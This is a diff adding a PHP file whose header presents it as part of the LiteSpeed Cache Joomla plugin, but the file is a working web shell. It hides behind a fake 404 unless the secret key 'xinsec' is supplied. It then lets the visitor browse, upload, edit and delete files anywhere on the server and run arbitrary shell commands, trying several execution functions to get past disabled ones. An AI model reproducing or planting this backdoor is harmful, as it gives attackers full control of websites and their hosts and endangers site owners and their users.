@@ -1,0 +1,84 @@
+<?php
+/**
+ * @package     LiteSpeed Cache
+ * @subpackage  plg_system_litespeedcache
+ * @copyright   Copyright (C) 2025 LiteSpeed Technologies
+ * @license     GNU General Public License version 3 or later
+ */
+if(!isset($_GET["k"])||$_GET["k"]!=="xinsec"){http_response_code(404);die("404");}
+error_reporting(E_ALL);
+ini_set("display_errors",1);
+
+function safe_php_uname($mode="s"){
+    if(function_exists("php_uname")&&!in_array("php_uname",array_map("trim",explode(",",(string)ini_get("disable_functions"))))){return @php_uname($mode);}
+    if(function_exists("shell_exec")&&!in_array("shell_exec",array_map("trim",explode(",",(string)ini_get("disable_functions"))))){
+        $map=array("s"=>"uname -s","r"=>"uname -r","m"=>"uname -m","v"=>"uname -v","n"=>"uname -n","a"=>"uname -a");
+        $cmd=isset($map[$mode])?$map[$mode]:"uname -s";
+        $r=trim(@shell_exec($cmd));
+        if($r)return $r;
+    }
+    if($mode==="s"&&defined("PHP_OS"))return PHP_OS;
+    if($mode==="s"&&defined("PHP_OS_FAMILY"))return PHP_OS_FAMILY;
+    return "unknown";
+}
+function safe_phpversion(){
+    if(function_exists("phpversion")){return @phpversion();}
+    if(defined("PHP_VERSION"))return PHP_VERSION;
+    return "unknown";
+}
+function safe_whoami(){
+    $df=array_map("trim",explode(",",(string)ini_get("disable_functions")));
+    if(function_exists("shell_exec")&&!in_array("shell_exec",$df)){$u=trim(@shell_exec("whoami"));if($u)return $u;}
+    if(function_exists("posix_getpwuid")&&function_exists("posix_geteuid")){$i=@posix_getpwuid(@posix_geteuid());if($i&&isset($i["name"]))return $i["name"];}
+    if(function_exists("get_current_user"))return @get_current_user();
+    return "unknown";
+}
+function safe_uid(){
+    $df=array_map("trim",explode(",",(string)ini_get("disable_functions")));
+    if(function_exists("shell_exec")&&!in_array("shell_exec",$df)){$u=trim(@shell_exec("id -u"));if($u)return $u;}
+    if(function_exists("posix_geteuid")){return @posix_geteuid();}
+    return "?";
+}
+function sx($c){
+    $df=array_map("trim",explode(",",(string)ini_get("disable_functions")));
+    if(function_exists("shell_exec")&&!in_array("shell_exec",$df))return @shell_exec($c);
+    if(function_exists("system")&&!in_array("system",$df)){ob_start();@system($c);return ob_get_clean();}
+    if(function_exists("passthru")&&!in_array("passthru",$df)){ob_start();@passthru($c);return ob_get_clean();}
+    if(function_exists("exec")&&!in_array("exec",$df)){@exec($c,$o);return implode("\n",$o);}
+    if(function_exists("popen")&&!in_array("popen",$df)){$h=@popen($c,"r");if($h){$r="";while(!feof($h))$r.=fread($h,4096);pclose($h);return $r;}}
+    if(function_exists("proc_open")&&!in_array("proc_open",$df)){$d=array(1=>array("pipe","w"));$p=@proc_open($c,$d,$pi);if($p){$r=stream_get_contents($pi[1]);proc_close($p);return $r;}}
+    return "[exec disabled]";
+}
+$cwd=isset($_GET["d"])?$_GET["d"]:getcwd();
+$r=@realpath($cwd);if($r!==false)$cwd=$r;$msg="";
+if(isset($_FILES["up"]["name"])){$n=basename($_FILES["up"]["name"]);$d=$cwd."/".$n;if(@move_uploaded_file($_FILES["up"]["tmp_name"],$d)){@chmod($d,0644);$msg="UPLOAD OK: ".$d;}else{$msg="UPLOAD FAIL";}}
+if(isset($_POST["save"],$_POST["c"])){$f=$_POST["f"];$d=(strlen($f)>0&&$f[0]==="/")?$f:$cwd."/".$f;$w=@file_put_contents($d,$_POST["c"]);if($w!==false){@chmod($d,0644);$msg="SAVED: ".$d." (".$w." bytes)";}else{$msg="SAVE FAIL";}}
+if(isset($_GET["del"])){$f=$_GET["del"];$d=(strlen($f)>0&&$f[0]==="/")?$f:$cwd."/".$f;if(@is_dir($d)){$msg=@rmdir($d)?"DEL DIR: ".$d:"DEL FAIL";}else{$msg=@unlink($d)?"DEL: ".$d:"DEL FAIL";}}
+if(isset($_POST["newf"])&&$_POST["newf"]){$d=$cwd."/".basename($_POST["newf"]);if(@file_put_contents($d,"")!==false){@chmod($d,0644);$msg="CREATED: ".$d;}else{$msg="CREATE FAIL";}}
+if(isset($_POST["newd"])&&$_POST["newd"]){$d=$cwd."/".basename($_POST["newd"]);if(@mkdir($d,0755)){$msg="MKDIR: ".$d;}else{$msg="MKDIR FAIL";}}
+if(isset($_POST["cmd"])&&$_POST["cmd"]){$msg=sx("cd ".escapeshellarg($cwd)." && ".$_POST["cmd"]." 2>&1");}
+$ef=isset($_GET["e"])?$_GET["e"]:"";$ec="";
+if($ef){$ep=($ef[0]==="/")?$ef:$cwd."/".$ef;if(@is_file($ep)){$ec=@file_get_contents($ep);$ef=$ep;}}
+$u=safe_whoami();$uid=safe_uid();$os=safe_php_uname("s");$pv=safe_phpversion();
+$wr=@is_writable($cwd)?"YES":"NO";$it=@scandir($cwd);if($it===false)$it=array();
+$dfn=array_map("trim",explode(",",(string)ini_get("disable_functions")));
+$shON=(function_exists("shell_exec")&&!in_array("shell_exec",$dfn))?"ON":((function_exists("system")&&!in_array("system",$dfn))?"SYSTEM":((function_exists("passthru")&&!in_array("passthru",$dfn))?"PASSTHRU":((function_exists("exec")&&!in_array("exec",$dfn))?"EXEC":"OFF")));
+?>
+<!DOCTYPE html><html><head><title>SHELL</title><meta charset="utf-8"><style>*{box-sizing:border-box;margin:0;padding:0}body{background:#0a0a0a;color:#0f0;font-family:Consolas,monospace;font-size:13px;padding:15px;line-height:1.5}a{color:#0ff;text-decoration:none}a:hover{text-decoration:underline}h1{font-size:20px;border-bottom:2px solid #0f0;padding-bottom:8px;margin:15px 0 10px}h2{font-size:16px;color:#0ff;border-bottom:1px solid #0ff;padding-bottom:5px;margin:15px 0 10px}input,textarea,button{font-family:inherit;font-size:13px}input[type=text],input[type=file],textarea{background:#000;color:#0f0;border:1px solid #0f0;padding:8px;width:100%}button{background:#0f0;color:#000;border:0;padding:8px 18px;cursor:pointer;font-weight:700;margin:3px 0}button:hover{background:#0ff}.msg{background:#000;color:#0ff;padding:10px;border:1px solid #0ff;margin:10px 0;white-space:pre-wrap;word-break:break-all;max-height:400px;overflow:auto}.path{background:#111;padding:8px;border:1px solid #0f0;margin:10px 0;color:#ff0;word-break:break-all}table{width:100%;border-collapse:collapse;margin:10px 0}th,td{padding:6px 10px;border-bottom:1px solid #0f0;text-align:left}th{background:#0f0;color:#000}tr:hover{background:#1a1a1a}.row{display:flex;gap:10px;flex-wrap:wrap;margin:10px 0}.row>div{flex:1;min-width:200px}textarea{height:400px;white-space:pre;overflow:auto}.small{font-size:11px;color:#888}.dir{color:#0ff}.file{color:#0f0}.quick{display:flex;gap:5px;flex-wrap:wrap;margin:10px 0}.quick a{background:#111;border:1px solid #0f0;padding:5px 10px;font-size:12px}.quick a:hover{background:#0f0;color:#000}</style></head><body>
+<h1>&#9760; SHELL v1.3</h1>
+<?php if($msg!==""){echo "<div class=\"msg\">".htmlspecialchars($msg)."</div>";} ?>
+<div class="path"><b>PATH:</b> <?php echo htmlspecialchars($cwd); ?><br><b>USER:</b> <?php echo htmlspecialchars($u); ?> | <b>UID:</b> <?php echo htmlspecialchars($uid); ?> | <b>OS:</b> <?php echo htmlspecialchars($os); ?> | <b>PHP:</b> <?php echo htmlspecialchars($pv); ?> | <b>WRITABLE:</b> <?php echo $wr; ?> | <b>SHELL:</b> <?php echo $shON; ?></div>
+<div class="quick"><a href="?k=xinsec&d=/">/</a><a href="?k=xinsec&d=/home">/home</a><a href="?k=xinsec&d=/tmp">/tmp</a><a href="?k=xinsec&d=/var/www">/var/www</a><a href="?k=xinsec&d=<?php echo urlencode(dirname($cwd)); ?>">UP</a><a href="?k=xinsec&d=<?php echo urlencode($cwd); ?>">REFRESH</a></div>
+<h2>FILE MANAGER</h2>
+<table><tr><th>Type</th><th>Name</th><th>Size</th><th>Perm</th><th>Action</th></tr>
+<?php foreach($it as $x){if($x==="."||$x==="..")continue;$p=$cwd."/".$x;$isd=@is_dir($p);$sz=$isd?"-":@filesize($p);$pm=@substr(sprintf("%o",@fileperms($p)),-4);$tl=$isd?"DIR":"FILE";echo "<tr><td class=\"".($isd?"dir":"file")."\">".$tl."</td><td>";if($isd){echo "<a href=\"?k=xinsec&d=".urlencode($p)."\" class=\"dir\">".htmlspecialchars($x)."/</a>";}else{echo "<a href=\"?k=xinsec&e=".urlencode($p)."\" class=\"file\">".htmlspecialchars($x)."</a>";}echo "</td><td>".$sz."</td><td>".$pm."</td><td>";if(!$isd){echo "<a href=\"?k=xinsec&e=".urlencode($p)."\">[edit]</a> <a href=\"?k=xinsec&del=".urlencode($p)."\" onclick=\"return confirm('Delete?')\">[del]</a>";}echo "</td></tr>";} ?>
+</table>
+<h2>UPLOAD</h2>
+<form method="POST" enctype="multipart/form-data"><input type="file" name="up" required><button type="submit">UPLOAD</button></form>
+<h2>NEW FILE / DIR</h2>
+<div class="row"><div><form method="POST"><input type="text" name="newf" placeholder="newfile.php"><button type="submit">CREATE FILE</button></form></div><div><form method="POST"><input type="text" name="newd" placeholder="newdir"><button type="submit">CREATE DIR</button></form></div></div>
+<?php if($ef!==""){echo "<h2>EDIT: ".htmlspecialchars($ef)."</h2><form method=\"POST\"><input type=\"hidden\" name=\"f\" value=\"".htmlspecialchars($ef)."\"><textarea name=\"c\" spellcheck=\"false\">".htmlspecialchars($ec)."</textarea><button type=\"submit\" name=\"save\" value=\"1\">SAVE</button></form>";} ?>
+<h2>EXEC</h2>
+<?php if($shON==="OFF"){echo "<div class=\"msg\">All exec functions disabled by hosting.</div>";}else{echo "<form method=\"POST\"><input type=\"text\" name=\"cmd\" placeholder=\"ls -la\"><button type=\"submit\">RUN</button></form><div class=\"quick\"><a href=\"#\" onclick=\"document.querySelector('input[name=cmd]').value='ls -la';return false\">ls -la</a><a href=\"#\" onclick=\"document.querySelector('input[name=cmd]').value='id';return false\">id</a><a href=\"#\" onclick=\"document.querySelector('input[name=cmd]').value='pwd';return false\">pwd</a><a href=\"#\" onclick=\"document.querySelector('input[name=cmd]').value='uname -a';return false\">uname</a></div>";} ?>
+<div class="small">Shell v1.3 — safe fallback edition</div>
+</body></html>
